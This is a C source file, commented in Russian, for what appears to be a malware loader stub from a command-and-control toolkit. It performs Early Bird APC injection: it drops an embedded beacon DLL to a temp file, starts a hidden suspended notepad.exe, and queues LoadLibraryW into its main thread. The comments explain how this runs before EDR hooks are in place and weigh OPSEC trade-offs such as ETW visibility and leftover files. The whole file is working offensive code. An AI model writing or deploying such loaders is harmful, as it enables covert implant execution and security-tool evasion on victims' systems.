// exe_apc_early.c -- Artifact stub: Early Bird APC injection.
//
// Техника:
//   1. Записать beacon DLL во временный файл.
//   2. Создать целевой процесс (notepad.exe) в состоянии CREATE_SUSPENDED.
//   3. Выделить память в целевом процессе, записать туда путь к DLL.
//   4. QueueUserAPC на главный поток цели — функция LoadLibraryW,
//      аргумент = указатель на путь.
//   5. ResumeThread главного потока.
//
// Почему "Early Bird": когда поток выходит из приостановки, он вызывает
// NtTestAlert ОЧЕНЬ рано в инициализации (до ntdll!LdrInitializeThunk
// заканчивает свою работу). APC отрабатывает ДО того, как user-mode hooks
// EDR успевают встать в memory image целевого процесса (часть EDR ставит
// хуки через DLL_PROCESS_ATTACH в инжектируемых хелпер-библиотеках).
//
// OPSEC:
//   + APC доставляется в "детском" процессе, родитель — наш стаб.
//   + Beacon работает внутри notepad.exe, не в стабе.
//   - На диске остаётся временный файл DLL (стираем после ResumeThread).
//   - CreateRemoteThread не используется, но VirtualAllocEx + WPM видны ETW.

#include "../artifact.h"

ART_DECLARE_PAYLOAD();

static const wchar_t g_target[] = L"C:\\Windows\\System32\\notepad.exe";

void __stdcall stub_main(void) {
    unsigned int sz;
    wchar_t tmppath[MAX_PATH + 1];
    // static -> .bss, zeroed by loader (без runtime memset = без _memset на x86)
    static STARTUPINFOW        si;
    static PROCESS_INFORMATION pi;
    SIZE_T nb, nw = 0;
    LPVOID rpath;

    ART_RESOLVE_APIS();

    sz = art_get_size(g_payload);
    if (!sz) ExitProcess(1);

    if (!art_write_temp(tmppath, g_payload, sz))
        ExitProcess(1);

    // Создаём целевой процесс suspended, без окна
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (!CreateProcessW(g_target, NULL, NULL, NULL, FALSE,
                        CREATE_SUSPENDED | CREATE_NO_WINDOW,
                        NULL, NULL, &si, &pi)) {
        DeleteFileW(tmppath);
        ExitProcess(1);
    }

    // Аллоцируем в цели и пишем путь к DLL
    nb = (SIZE_T)(lstrlenW(tmppath) + 1) * sizeof(wchar_t);
    rpath = VirtualAllocEx(pi.hProcess, NULL, nb,
                           MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!rpath) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        DeleteFileW(tmppath);
        ExitProcess(1);
    }

    if (!WriteProcessMemory(pi.hProcess, rpath, tmppath, nb, &nw) || nw != nb) {
        VirtualFreeEx(pi.hProcess, rpath, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        DeleteFileW(tmppath);
        ExitProcess(1);
    }

    // Очередь APC на главный поток: LoadLibraryW(rpath)
    // Используем уже разрешённый по хешу указатель — без строки имени.
    if (!QueueUserAPC((PAPCFUNC)g_api.f_LoadLibraryW, pi.hThread, (ULONG_PTR)rpath)) {
        VirtualFreeEx(pi.hProcess, rpath, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        DeleteFileW(tmppath);
        ExitProcess(1);
    }

    // Resume — APC стрельнёт во время LdrInitializeThunk через NtTestAlert
    ResumeThread(pi.hThread);

    // Даём LoadLibraryW время отработать (DLL замаппится в память цели),
    // потом удаляем временный файл.
    Sleep(3000);
    DeleteFileW(tmppath);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    ExitProcess(0);
}
